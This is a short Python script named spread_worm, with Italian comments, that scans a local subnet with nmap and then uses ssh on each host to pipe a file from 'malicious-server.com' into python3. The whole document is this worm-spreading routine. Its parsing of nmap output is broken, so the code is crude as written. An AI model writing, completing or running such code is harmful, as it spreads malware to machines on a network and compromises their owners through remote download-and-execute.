import subprocess

def spread_worm():
    # Trova tutte le macchine nella rete locale
    result = subprocess.run(["nmap", "-sn", "192.168.1.0/24"], capture_output=True)
    local_machines = result.stdout.decode().split("\n")
    for machine in local_machines:
        # Installa il malware in modo remoto su ciascuna macchina
        subprocess.run(["ssh", f"user@{machine}", "curl -s https://malicious-server.com/malware.py | python3"])
